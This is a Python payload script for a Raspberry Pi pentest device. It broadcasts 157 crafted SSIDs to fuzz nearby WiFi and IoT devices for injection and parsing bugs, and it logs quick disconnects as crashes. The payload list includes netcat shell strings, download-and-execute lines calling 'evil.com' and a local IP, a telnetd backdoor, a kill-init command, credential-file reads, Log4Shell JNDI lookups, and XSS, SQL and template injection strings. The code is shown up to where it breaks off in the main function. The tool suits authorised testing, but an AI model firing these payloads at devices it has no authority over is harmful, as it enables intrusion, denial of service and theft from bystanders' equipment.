#!/usr/bin/env python3
"""
RaspyJack Payload -- CIW Zeroclick
====================================
Author: 7h30th3r0n3

SSID Injection Testing Framework for IoT & WiFi device security assessment.
Broadcasts crafted SSID payloads to detect parsing vulnerabilities, buffer
overflows, and command injection flaws in nearby devices.

Based on CommandInWiFi-Zeroclick concept by V33RU.
Ported from Evil-M5Project (ESP32) to Raspyjack (Raspberry Pi).

Workflow:
  1) Select payload categories (14 categories, 157 payloads)
  2) Start broadcast — hostapd rotates SSIDs at configurable interval
  3) Monitor connecting devices via hostapd events
  4) Detect potential crashes (disconnect < 10s)
  5) View results (devices + crash alerts)

Controls:
  UP / DOWN  -- Navigate menu / scroll
  OK         -- Select / toggle / start-stop
  LEFT       -- Previous payload (during broadcast)
  RIGHT      -- Next payload (during broadcast)
  KEY1       -- Select WiFi interface
  KEY2       -- Set rotation interval
  KEY3       -- Exit / stop + exit

Loot: /root/Raspyjack/loot/CIW/
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import re
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_interface, supports_monitor

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
ROW_H = 12
ROWS_VISIBLE = 7

LOOT_DIR = "/root/Raspyjack/loot/CIW"
PAYLOADS_FILE = os.path.join(LOOT_DIR, "payloads.json")
ALERTS_FILE = os.path.join(LOOT_DIR, "alerts.log")
HOSTAPD_CONF = "/tmp/rj_ciw_hostapd.conf"
DNSMASQ_CONF = "/tmp/rj_ciw_dnsmasq.conf"
GATEWAY_IP = "10.0.88.1"

# ---------------------------------------------------------------------------
# 14 payload categories with 157 payloads
# ---------------------------------------------------------------------------
CAT_NAMES = [
    "wifi_cmd", "wifi_overflow", "wifi_fmt", "wifi_probe", "wifi_esc",
    "wifi_serial", "wifi_enc", "wifi_chain", "wifi_heap", "wifi_xss",
    "wifi_path", "wifi_crlf", "wifi_jndi", "wifi_nosql",
]

DEFAULT_PAYLOADS = [
    # wifi_cmd (25)
    {"t": "|reboot|", "c": "wifi_cmd", "d": "Pipe operator reboot"},
    {"t": "&reboot&", "c": "wifi_cmd", "d": "Ampersand command chain"},
    {"t": "`reboot`", "c": "wifi_cmd", "d": "Backtick command substitution"},
    {"t": "$reboot$", "c": "wifi_cmd", "d": "Dollar-sign variable expansion"},
    {"t": ";reboot;", "c": "wifi_cmd", "d": "Semicolon command separator"},
    {"t": "$(reboot)", "c": "wifi_cmd", "d": "Subshell command substitution"},
    {"t": "|shutdown -r|", "c": "wifi_cmd", "d": "Pipe with shutdown"},
    {"t": "&cat /etc/passwd", "c": "wifi_cmd", "d": "Ampersand passwd read"},
    {"t": "reboot\\nreboot", "c": "wifi_cmd", "d": "Newline command injection"},
    {"t": "reboot\\r\\nreboot", "c": "wifi_cmd", "d": "CRLF command injection"},
    {"t": "|../../bin/sh|", "c": "wifi_cmd", "d": "Path traversal to shell"},
    {"t": "${IFS}reboot", "c": "wifi_cmd", "d": "IFS variable separator"},
    {"t": "*;reboot", "c": "wifi_cmd", "d": "Glob with command chain"},
    {"t": "$(echo reboot|sh)", "c": "wifi_cmd", "d": "Echo piped to shell"},
    {"t": "reboot\\x00ignored", "c": "wifi_cmd", "d": "Null byte truncation"},
    {"t": "|nc -lp 4444 -e sh|", "c": "wifi_cmd", "d": "Netcat reverse shell via pipe"},
    {"t": "&wget evil.com/x&", "c": "wifi_cmd", "d": "Download+execute via ampersand"},
    {"t": "$(curl evil.com)", "c": "wifi_cmd", "d": "Curl fetch via subshell"},
    {"t": "|id>/tmp/pwn|", "c": "wifi_cmd", "d": "Write id output to file"},
    {"t": "\\x00|reboot|", "c": "wifi_cmd", "d": "Null-prefix command injection"},
    {"t": "& ping -n 3 127.0.0.1 &", "c": "wifi_cmd", "d": "Windows cmd ping injection"},
    {"t": "|powershell -c reboot|", "c": "wifi_cmd", "d": "PowerShell command via pipe"},
    {"t": "`busybox reboot`", "c": "wifi_cmd", "d": "BusyBox-specific reboot"},
    {"t": "$(kill -9 1)", "c": "wifi_cmd", "d": "Kill init process PID 1"},
    {"t": "|/bin/busybox telnetd|", "c": "wifi_cmd", "d": "BusyBox telnet backdoor"},

    # wifi_overflow (26)
    {"t": "A" * 32, "c": "wifi_overflow", "d": "32-byte A fill"},
    {"t": "A" * 64, "c": "wifi_overflow", "d": "64-byte A fill"},
    {"t": "\\x41" * 16, "c": "wifi_overflow", "d": "16-byte hex 0x41 fill"},
    {"t": "\\x00" * 16, "c": "wifi_overflow", "d": "16-byte null fill"},
    {"t": "\\x7f" * 16, "c": "wifi_overflow", "d": "16-byte DEL fill"},
    {"t": "A" * 33, "c": "wifi_overflow", "d": "33-byte off-by-one"},
    {"t": "A" * 65, "c": "wifi_overflow", "d": "65-byte off-by-one"},
    {"t": "A" * 16 + "\\x00" + "A" * 15, "c": "wifi_overflow", "d": "Null-terminated boundary"},
    {"t": "A" * 28 + "\\r\\nAA", "c": "wifi_overflow", "d": "CRLF at boundary"},
    {"t": "\\xff" * 16, "c": "wifi_overflow", "d": "16-byte 0xFF fill"},
    {"t": "A" * 8 + "\\x00" * 4 + "A" * 8, "c": "wifi_overflow", "d": "Half-null padding"},
    {"t": "%s%s%s%s" + "A" * 28, "c": "wifi_overflow", "d": "Overflow + format write"},
    {"t": "DEAD" + "\\x41" * 12 + "DEAD", "c": "wifi_overflow", "d": "Canary markers DEAD"},
    {"t": "\\x41" * 4 + "\\x42" * 4 + "\\x43" * 4 + "\\x44" * 4, "c": "wifi_overflow", "d": "Address overwrite pattern"},
    {"t": "A" * 64 + "\\x00", "c": "wifi_overflow", "d": "64-byte + null terminator"},
    {"t": "A", "c": "wifi_overflow", "d": "Single byte"},
    {"t": "", "c": "wifi_overflow", "d": "Empty SSID"},
    {"t": " ", "c": "wifi_overflow", "d": "Single space SSID"},
    {"t": "A" * 30 + "%n", "c": "wifi_overflow", "d": "Overflow + format write %n"},
    {"t": "\\x80" * 16, "c": "wifi_overflow", "d": "High-bit byte fill"},
    {"t": "\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10", "c": "wifi_overflow", "d": "Sequential byte fill"},
    {"t": "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456", "c": "wifi_overflow", "d": "32-byte sequential ASCII"},
    {"t": "\\xfe\\xff" * 8, "c": "wifi_overflow", "d": "Alternating 0xFE/0xFF"},
    {"t": "\\x00" + "A" * 31, "c": "wifi_overflow", "d": "Null prefix + fill"},
    {"t": "A" * 31 + "\\x00", "c": "wifi_overflow", "d": "Fill + null suffix"},
    {"t": "\\xde\\xad\\xbe\\xef" * 4, "c": "wifi_overflow", "d": "DEADBEEF pattern repeat"},

    # wifi_fmt (15)
    {"t": "%s%s%s%s%s", "c": "wifi_fmt", "d": "Format string read crash"},
    {"t": "%n%n%n%n", "c": "wifi_fmt", "d": "Format string write"},
    {"t": "%x%x%x%x", "c": "wifi_fmt", "d": "Format hex leak"},
    {"t": "%p%p%p%p", "c": "wifi_fmt", "d": "Format pointer leak"},
    {"t": "%d%d%d%d%d%d", "c": "wifi_fmt", "d": "Format decimal overflow"},
    {"t": "AAAA%08x%08x%08x", "c": "wifi_fmt", "d": "Format with canary"},
    {"t": "%s" * 10, "c": "wifi_fmt", "d": "10x string deref"},
    {"t": "%x" * 16, "c": "wifi_fmt", "d": "16x hex leak"},
    {"t": "%08x.%08x.%08x.%08x", "c": "wifi_fmt", "d": "Dotted hex leak"},
    {"t": "%n" * 8, "c": "wifi_fmt", "d": "8x format write"},
    {"t": "%hn%hn%hn%hn", "c": "wifi_fmt", "d": "Half-word format write"},
    {"t": "%1$s%2$s%3$s", "c": "wifi_fmt", "d": "Positional string deref"},
    {"t": "%1$n%2$n", "c": "wifi_fmt", "d": "Positional write"},
    {"t": "%.9999d", "c": "wifi_fmt", "d": "Width overflow"},
    {"t": "%c" * 32, "c": "wifi_fmt", "d": "32x char print"},

    # wifi_probe (14)
    {"t": "", "c": "wifi_probe", "d": "Empty SSID probe"},
    {"t": " ", "c": "wifi_probe", "d": "Single space probe"},
    {"t": "\\x00", "c": "wifi_probe", "d": "Single null byte"},
    {"t": "\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08", "c": "wifi_probe", "d": "Control char fill"},
    {"t": "\\t\\n\\r\\t\\n\\r\\t\\n", "c": "wifi_probe", "d": "Whitespace controls"},
    {"t": "\\xe2\\x80\\x8b" * 3, "c": "wifi_probe", "d": "Zero-width spaces UTF-8"},
    {"t": "ValidSSID\\xff", "c": "wifi_probe", "d": "Trailing invalid byte"},
    {"t": "Test\\x00Hidden", "c": "wifi_probe", "d": "Null-embedded SSID"},
    {"t": "\\xef\\xbb\\xbfBOM_SSID", "c": "wifi_probe", "d": "UTF-8 BOM prefix"},
    {"t": "\\x1b[0m" * 4, "c": "wifi_probe", "d": "Escape sequence flood"},
    {"t": "\\xe2\\x80\\xaeSSID_SPOOF", "c": "wifi_probe", "d": "RTL override spoof"},
    {"t": "DIRECT-xx-SPOOF", "c": "wifi_probe", "d": "WiFi Direct prefix spoof"},
    {"t": "\\xc0\\x80" * 4, "c": "wifi_probe", "d": "Overlong null encoding"},
    {"t": "\\xed\\xa0\\x80" * 2, "c": "wifi_probe", "d": "Lone surrogate codepoints"},

    # wifi_esc (8)
    {"t": "\\x1b[2J\\x1b[H", "c": "wifi_esc", "d": "ANSI clear screen"},
    {"t": "\\x1b]0;HACKED\\x07", "c": "wifi_esc", "d": "OSC title set"},
    {"t": "\\x1b[6n", "c": "wifi_esc", "d": "Cursor position report"},
    {"t": "\\x1b[?47h", "c": "wifi_esc", "d": "Alt screen buffer"},
    {"t": "\\x1b[31mERROR\\x1b[0m", "c": "wifi_esc", "d": "Red colored fake log"},
    {"t": "\\x1b[1A\\x1b[2K", "c": "wifi_esc", "d": "Overwrite log line"},
    {"t": "\\x1b[32mroot@srv\\x1b[0m", "c": "wifi_esc", "d": "Fake root log"},
    {"t": "\\x1b[8m", "c": "wifi_esc", "d": "Hidden text mode"},

    # wifi_serial (13)
    {"t": '","admin":true,"x":"', "c": "wifi_serial", "d": "JSON key injection"},
    {"t": "</name><admin>1</admin>", "c": "wifi_serial", "d": "XML tag escape"},
    {"t": "'; DROP TABLE wifi;--", "c": "wifi_serial", "d": "SQLite injection"},
    {"t": '{"role":"admin"}', "c": "wifi_serial", "d": "JSON privilege escalation"},
    {"t": "key=val\\nnewsection", "c": "wifi_serial", "d": "INI newline injection"},
    {"t": "{{7*7}}", "c": "wifi_serial", "d": "Jinja template injection"},
    {"t": "<%= system('id') %>", "c": "wifi_serial", "d": "ERB template injection"},
    {"t": "${7*7}", "c": "wifi_serial", "d": "SSTI expression"},
    {"t": '=CMD("calc")', "c": "wifi_serial", "d": "Excel formula CMD"},
    {"t": "-1+1+cmd|'/C calc'!A0", "c": "wifi_serial", "d": "DDE minus prefix"},
    {"t": "+1+cmd|'/C calc'!A0", "c": "wifi_serial", "d": "DDE plus prefix"},
    {"t": "!!python/object/apply:os.system ['reboot']", "c": "wifi_serial", "d": "YAML deserialization"},
    {"t": 'O:8:"stdClass":0:{}', "c": "wifi_serial", "d": "PHP object deserialization"},

    # wifi_enc (8)
    {"t": "\\uff04(reboot)", "c": "wifi_enc", "d": "Fullwidth dollar normalization"},
    {"t": "\\uff5creboot\\uff5c", "c": "wifi_enc", "d": "Fullwidth pipe normalization"},
    {"t": "\\uff1breboot\\uff1b", "c": "wifi_enc", "d": "Fullwidth semicolon normalization"},
    {"t": "%7Creboot%7C", "c": "wifi_enc", "d": "URL-encoded pipe"},
    {"t": "%24(reboot)", "c": "wifi_enc", "d": "URL-encoded dollar"},
    {"t": "\\u0060reboot\\u0060", "c": "wifi_enc", "d": "JSON Unicode-escaped backtick"},
    {"t": "&vert;reboot&vert;", "c": "wifi_enc", "d": "HTML entity pipe"},
    {"t": "\\xc0\\xafetc\\xc0\\xafpasswd", "c": "wifi_enc", "d": "Overlong UTF-8 slash"},

    # wifi_chain (8)
    {"t": "$(", "c": "wifi_chain", "d": "Split subshell open"},
    {"t": "reboot)", "c": "wifi_chain", "d": "Split subshell close"},
    {"t": "|nc 192.168.4.1", "c": "wifi_chain", "d": "Split netcat addr"},
    {"t": "4444 -e /bin/sh|", "c": "wifi_chain", "d": "Split netcat port"},
    {"t": "%x%x%x%x_LEAK", "c": "wifi_chain", "d": "Format leak phase"},
    {"t": "%n%n_WRITE", "c": "wifi_chain", "d": "Format write phase"},
    {"t": "wget http://192.168", "c": "wifi_chain", "d": "Split wget URL"},
    {"t": ".4.1/x -O-|sh", "c": "wifi_chain", "d": "Split wget exec"},

    # wifi_heap (8)
    {"t": "\\x00" * 4 + "\\x11\\x00\\x00\\x00", "c": "wifi_heap", "d": "dlmalloc prev_size pattern"},
    {"t": "\\x41\\x00\\x00\\x00" * 2, "c": "wifi_heap", "d": "Fake chunk size"},
    {"t": "\\xde\\xad\\xbe\\xef", "c": "wifi_heap", "d": "DEADBEEF canary"},
    {"t": "\\x01" * 8, "c": "wifi_heap", "d": "Integer 1 spray"},
    {"t": "\\xfe" * 8, "c": "wifi_heap", "d": "Near-max byte spray"},
    {"t": "\\x00" * 8 + "\\x08\\x04\\x00\\x40", "c": "wifi_heap", "d": "Null sled + return addr"},
    {"t": "\\xba\\xad\\xf0\\x0d", "c": "wifi_heap", "d": "BAADF00D marker"},
    {"t": "\\x41" * 8 + "\\x00\\x00\\x00\\x41", "c": "wifi_heap", "d": "Heap spray + boundary"},

    # wifi_xss (8)
    {"t": "<script>alert(1)</script>", "c": "wifi_xss", "d": "Script tag alert"},
    {"t": "<img src=x onerror=alert(1)>", "c": "wifi_xss", "d": "Img onerror XSS"},
    {"t": "<svg onload=alert(1)>", "c": "wifi_xss", "d": "SVG onload"},
    {"t": "<body onload=alert(1)>", "c": "wifi_xss", "d": "Body onload"},
    {"t": "<details open ontoggle=alert(1)>", "c": "wifi_xss", "d": "Details ontoggle"},
    {"t": "<iframe src=javascript:alert(1)>", "c": "wifi_xss", "d": "Iframe injection"},
    {"t": "';alert(1)//", "c": "wifi_xss", "d": "JS string breakout"},
    {"t": "<marquee onstart=alert(1)>", "c": "wifi_xss", "d": "Marquee onstart"},

    # wifi_path (6)
    {"t": "../../../etc/shadow", "c": "wifi_path", "d": "Classic path traversal"},
    {"t": "..\\\\..\\\\..\\\\etc\\\\shadow", "c": "wifi_path", "d": "Double-dot bypass"},
    {"t": "%2e%2e%2f" * 3 + "etc%2fpasswd", "c": "wifi_path", "d": "URL-encoded traversal"},
    {"t": "/proc/self/environ", "c": "wifi_path", "d": "Proc environ read"},
    {"t": "..\\\\..\\\\..\\\\windows\\\\system32", "c": "wifi_path", "d": "Mixed separator Windows"},
    {"t": "/dev/urandom", "c": "wifi_path", "d": "Dev urandom read"},

    # wifi_crlf (6)
    {"t": "\\r\\nX-Injected: true", "c": "wifi_crlf", "d": "Custom header injection"},
    {"t": "%0d%0aSet-Cookie:pwned=1", "c": "wifi_crlf", "d": "URL-encoded cookie"},
    {"t": "\\r\\nLocation: http://evil", "c": "wifi_crlf", "d": "Redirect injection"},
    {"t": "\\r\\n\\r\\n<html>injected", "c": "wifi_crlf", "d": "Response splitting"},
    {"t": "\\r\\nTransfer-Encoding:chunked", "c": "wifi_crlf", "d": "Request smuggling"},
    {"t": "\\r\\nContent-Length:0\\r\\n\\r\\n", "c": "wifi_crlf", "d": "Content-Length injection"},

    # wifi_jndi (6)
    {"t": "${jndi:ldap://evil/x}", "c": "wifi_jndi", "d": "Log4Shell LDAP"},
    {"t": "${jndi:dns://evil/x}", "c": "wifi_jndi", "d": "JNDI DNS exfil"},
    {"t": "${env:AWS_SECRET}", "c": "wifi_jndi", "d": "Env variable leak"},
    {"t": "${sys:java.version}", "c": "wifi_jndi", "d": "System property leak"},
    {"t": "${jndi:rmi://evil/x}", "c": "wifi_jndi", "d": "JNDI RMI"},
    {"t": "${${lower:j}ndi:ldap://x}", "c": "wifi_jndi", "d": "Polyglot template probe"},

    # wifi_nosql (6)
    {"t": "admin' || '1'=='1", "c": "wifi_nosql", "d": "MongoDB $gt bypass"},
    {"t": '{"$ne":1}', "c": "wifi_nosql", "d": "MongoDB $ne injection"},
    {"t": '{"$regex":".*"}', "c": "wifi_nosql", "d": "MongoDB $regex match-all"},
    {"t": '{"$where":"sleep(5000)"}', "c": "wifi_nosql", "d": "MongoDB $where sleep"},
    {"t": "*)(objectClass=*)", "c": "wifi_nosql", "d": "LDAP wildcard filter"},
    {"t": "admin)(!(&(1=0", "c": "wifi_nosql", "d": "LDAP password bypass"},
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
_running = True
broadcasting = False
current_idx = 0
rotation_interval = 5  # seconds
selected_cats = {c: True for c in CAT_NAMES}  # all enabled
active_payloads = []
devices = []       # [{mac, connect_time, payload_idx}]
alerts = []        # [{mac, ssid, duration_ms, timestamp}]
status_msg = "Ready"
scroll = 0
view = "menu"      # menu | categories | broadcast | devices | alerts | rotation | iface_select

_hostapd_proc = None
_iface = None


def _cleanup_signal(*_):
    global _running
    _running = False


signal.signal(signal.SIGINT, _cleanup_signal)
signal.signal(signal.SIGTERM, _cleanup_signal)

# ---------------------------------------------------------------------------
# Interface detection
# ---------------------------------------------------------------------------

def _get_iface_info(iface):
    info = {"name": iface, "driver": "", "is_onboard": False, "supports_ap": False}
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            info["is_onboard"] = True
    except Exception:
        pass
    try:
        drv = os.path.basename(os.path.realpath(f"/sys/class/net/{iface}/device/driver"))
        info["driver"] = drv
        if drv == "brcmfmac":
            info["is_onboard"] = True
            info["supports_monitor"] = supports_monitor(iface)
    except Exception:
        pass
    try:
        phy_link = os.path.realpath(f"/sys/class/net/{iface}/phy80211")
        phy_name = os.path.basename(phy_link)
        r = subprocess.run(["iw", "phy", phy_name, "info"],
                           capture_output=True, text=True, timeout=5)
        if "* AP" in r.stdout:
            info["supports_ap"] = True
    except Exception:
        pass
    return info


def _list_wifi_interfaces():
    ifaces = []
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if not name.startswith("wlan"):
                continue
            ifaces.append(_get_iface_info(name))
    except Exception:
        pass
    return sorted(ifaces, key=lambda x: (x["is_onboard"], x["name"]))

# ---------------------------------------------------------------------------
# Payload management
# ---------------------------------------------------------------------------

def _ensure_payloads():
    """Create payloads.json if it doesn't exist."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    if not os.path.isfile(PAYLOADS_FILE):
        with open(PAYLOADS_FILE, "w") as f:
            json.dump(DEFAULT_PAYLOADS, f, indent=1)


def _load_payloads():
    """Load payloads filtered by selected categories."""
    global active_payloads
    try:
        with open(PAYLOADS_FILE, "r") as f:
            all_p = json.load(f)
    except Exception:
        all_p = list(DEFAULT_PAYLOADS)

    enabled = {c for c, on in selected_cats.items() if on}
    active_payloads = [p for p in all_p if p.get("c", "") in enabled]

# ---------------------------------------------------------------------------
# Broadcast engine
# ---------------------------------------------------------------------------

def _start_broadcast(iface):
    """Start hostapd AP with first payload SSID."""
    global _hostapd_proc, broadcasting, current_idx, devices, alerts, status_msg

    _load_payloads()
    if not active_payloads:
        with lock:
            status_msg = "No payloads selected!"
        return

    current_idx = 0
    devices = []
    alerts = []

    # Kill existing
    subprocess.run(["sudo", "pkill", "-f", "rj_ciw"], capture_output=True, timeout=5)
    time.sleep(0.3)

    # Configure interface
    for cmd in [
        ["sudo", "ip", "link", "set", iface, "down"],
        ["sudo", "iw", "dev", iface, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", iface, "up"],
        ["sudo", "ip", "addr", "flush", "dev", iface],
        ["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", iface],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)

    ssid = active_payloads[0]["t"][:32] or "CIW_Test"

    with open(HOSTAPD_CONF, "w") as f:
        f.write(
            f"interface={iface}\ndriver=nl80211\nssid={ssid}\n"
            f"hw_mode=g\nchannel=6\nwmm_enabled=0\n"
            f"auth_algs=1\nwpa=0\nmax_num_sta=10\n"
        )

    _hostapd_proc = subprocess.Popen(
        ["sudo", "hostapd", HOSTAPD_CONF],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    )

    # Wait and check if hostapd started OK
    time.sleep(2)
    if _hostapd_proc.poll() is not None:
        # hostapd exited immediately - read error
        err = ""
        try:
            err = _hostapd_proc.stdout.read().decode("utf-8", errors="replace")[-200:]
        except Exception:
            pass
        with lock:
            status_msg = f"hostapd FAILED: {err[:40]}"
        _hostapd_proc = None
        return

    # Start event monitor thread
    threading.Thread(target=_monitor_hostapd_events, daemon=True).start()

    broadcasting = True
    with lock:
        status_msg = f"Broadcasting 1/{len(active_payloads)}"


def _stop_broadcast():
    """Stop broadcast and cleanup."""
    global _hostapd_proc, broadcasting, status_msg

    broadcasting = False
    if _hostapd_proc:
        _hostapd_proc.terminate()
        try:
            _hostapd_proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            _hostapd_proc.kill()
        _hostapd_proc = None

    subprocess.run(["sudo", "pkill", "-f", "rj_ciw"], capture_output=True, timeout=5)
    with lock:
        status_msg = "Stopped"


def _rotate_ssid(iface):
    """Change SSID to next payload by rewriting hostapd config and reloading."""
    global current_idx, _hostapd_proc

    current_idx = (current_idx + 1) % len(active_payloads)
    ssid = active_payloads[current_idx]["t"][:32] or "CIW_Test"

    with open(HOSTAPD_CONF, "w") as f:
        f.write(
            f"interface={iface}\ndriver=nl80211\nssid={ssid}\n"
            f"hw_mode=g\nchannel=6\nwmm_enabled=0\n"
            f"auth_algs=1\nwpa=0\nmax_num_sta=10\n"
        )

    # Reload hostapd by restarting
    if _hostapd_proc:
        _hostapd_proc.terminate()
        try:
            _hostapd_proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            _hostapd_proc.kill()

    _hostapd_proc = subprocess.Popen(
        ["sudo", "hostapd", HOSTAPD_CONF],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
    )
    threading.Thread(target=_monitor_hostapd_events, daemon=True).start()

    with lock:
        status_msg = f"[{current_idx + 1}/{len(active_payloads)}] {ssid[:16]}"


def _monitor_hostapd_events():
    """Parse hostapd stdout for STA connect/disconnect events."""
    global devices, alerts
    proc = _hostapd_proc
    if not proc or not proc.stdout:
        return

    connect_times = {}  # mac -> time

    try:
        for raw_line in proc.stdout:
            if not _running or not broadcasting:
                break
            line = raw_line.decode("utf-8", errors="replace").strip()

            # AP-STA-CONNECTED aa:bb:cc:dd:ee:ff
            m = re.search(r"AP-STA-CONNECTED\s+([0-9a-fA-F:]{17})", line)
            if m:
                mac = m.group(1).upper()
                connect_times[mac] = time.time()
                with lock:
                    devices.append({
                        "mac": mac,
                        "connect_time": time.time(),
                        "payload_idx": current_idx,
                    })
                    if len(devices) > 50:
                        devices.pop(0)
                continue

            # AP-STA-DISCONNECTED aa:bb:cc:dd:ee:ff
            m = re.search(r"AP-STA-DISCONNECTED\s+([0-9a-fA-F:]{17})", line)
            if m:
                mac = m.group(1).upper()
                ct = connect_times.pop(mac, None)
                if ct:
                    duration_ms = int((time.time() - ct) * 1000)
                    if duration_ms < 10000:
                        ssid = active_payloads[current_idx]["t"][:32] if current_idx < len(active_payloads) else "?"
                        with lock:
                            alerts.append({
                                "mac": mac,
                                "ssid": ssid,
                                "duration_ms": duration_ms,
                                "timestamp": datetime.now().isoformat(),
                            })
                            if len(alerts) > 20:
                                alerts.pop(0)
                        # Log alert
                        try:
                            with open(ALERTS_FILE, "a") as f:
                                f.write(f"{datetime.now().isoformat()} CRASH {mac} {duration_ms}ms SSID={ssid}\n")
                        except Exception:
                            pass
    except Exception:
        pass

# ---------------------------------------------------------------------------
# LCD Display
# ---------------------------------------------------------------------------

def _draw_menu(lcd, font_obj, sel):
    items = [
        "Select Categories",
        "START Attack" if not broadcasting else "STOP Attack",
        f"View Devices ({len(devices)})",
        f"View Alerts ({len(alerts)})",
        f"Set Rotation ({rotation_interval}s)",
        f"Interface: {_iface or '?'}",
    ]
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "CIW ZEROCLICK", font=font_obj, fill="#FF4444")

    for i, item in enumerate(items):
        y = 18 + i * 14
        color = "#00FF00" if i == sel else "#CCCCCC"
        prefix = ">" if i == sel else " "
        d.text((2, y), f"{prefix}{item[:22]}", font=font_obj, fill=color)

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "OK:Sel KEY3:Exit", font=font_obj, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


def _draw_broadcast(lcd, font_obj):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.rectangle((0, 0, 127, 13), fill="#440000")
    d.text((2, 1), "CIW BROADCASTING", font=font_obj, fill="#FF4444")

    with lock:
        msg = status_msg
        dc = len(devices)
        ac = len(alerts)

    if active_payloads and current_idx < len(active_payloads):
        p = active_payloads[current_idx]
        ssid_display = p["t"][:20] or "(empty)"
        cat = p["c"]
    else:
        ssid_display = "?"
        cat = "?"

    d.text((2, 16), f"SSID: {ssid_display}", font=font_obj, fill="#FFFFFF")
    d.text((2, 28), f"[{current_idx + 1}/{len(active_payloads)}]", font=font_obj, fill="#888")
    d.text((60, 28), f"Cat: {cat[:12]}", font=font_obj, fill="#FFAA00")

    d.text((2, 44), f"Devices: {dc}", font=font_obj, fill="#00FF00")
    alert_color = "#FF0000" if ac > 0 else "#888"
    d.text((2, 56), f"Alerts: {ac}", font=font_obj, fill=alert_color)

    d.text((2, 72), f"Interval: {rotation_interval}s", font=font_obj, fill="#888")

    # Description
    if active_payloads and current_idx < len(active_payloads):
        desc = active_payloads[current_idx].get("d", "")[:24]
        d.text((2, 86), desc, font=font_obj, fill="#666")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "L/R:nav OK:Stop K3:Quit", font=font_obj, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


def _draw_categories(lcd, font_obj, sel, cat_scroll):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "SELECT CATEGORIES", font=font_obj, fill="#58a6ff")

    visible = CAT_NAMES[cat_scroll:cat_scroll + ROWS_VISIBLE]
    for i, cat in enumerate(visible):
        y = 16 + i * ROW_H
        idx = cat_scroll + i
        on = selected_cats.get(cat, False)
        check = "[x]" if on else "[ ]"
        color = "#00FF00" if idx == sel else "#CCCCCC"
        d.text((2, y), f"{check} {cat[:16]}", font=font_obj, fill=color)

    # Select/deselect all at bottom
    total = sum(1 for v in selected_cats.values() if v)
    d.text((2, 100), f"{total}/{len(CAT_NAMES)} selected", font=font_obj, fill="#888")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "OK:Tog K1:All K2:GO K3:Bk", font=font_obj, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


def _draw_devices(lcd, font_obj, dscroll):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), f"DEVICES ({len(devices)})", font=font_obj, fill="#00CCFF")

    with lock:
        devs = list(devices)

    if not devs:
        d.text((2, 40), "No devices yet", font=font_obj, fill="#666")
    else:
        visible = devs[dscroll:dscroll + 5]
        for i, dev in enumerate(visible):
            y = 18 + i * 20
            d.text((2, y), dev["mac"][-11:], font=font_obj, fill="#CCCCCC")
            if dev["payload_idx"] < len(active_payloads):
                ssid = active_payloads[dev["payload_idx"]]["t"][:18]
                d.text((2, y + 10), ssid, font=font_obj, fill="#888")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "U/D:Scroll KEY3:Back", font=font_obj, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


def _draw_alerts(lcd, font_obj, ascroll):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.rectangle((0, 0, 127, 13), fill="#440000")
    d.text((2, 1), f"CRASH ALERTS ({len(alerts)})", font=font_obj, fill="#FF4444")

    with lock:
        als = list(alerts)

    if not als:
        d.text((2, 40), "No alerts yet", font=font_obj, fill="#666")
    else:
        visible = als[ascroll:ascroll + 3]
        for i, al in enumerate(visible):
            y = 18 + i * 30
            d.text((2, y), al["mac"][-11:], font=font_obj, fill="#FF4444")
            d.text((2, y + 10), al["ssid"][:18], font=font_obj, fill="#FFAA00")
            d.text((2, y + 20), f"{al['duration_ms']}ms", font=font_obj, fill="#888")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), "U/D:Scroll KEY3:Back", font=font_obj, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running, view, scroll, broadcasting, rotation_interval, selected_cats, _iface
    global current_idx

    _ensure_payloads()

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
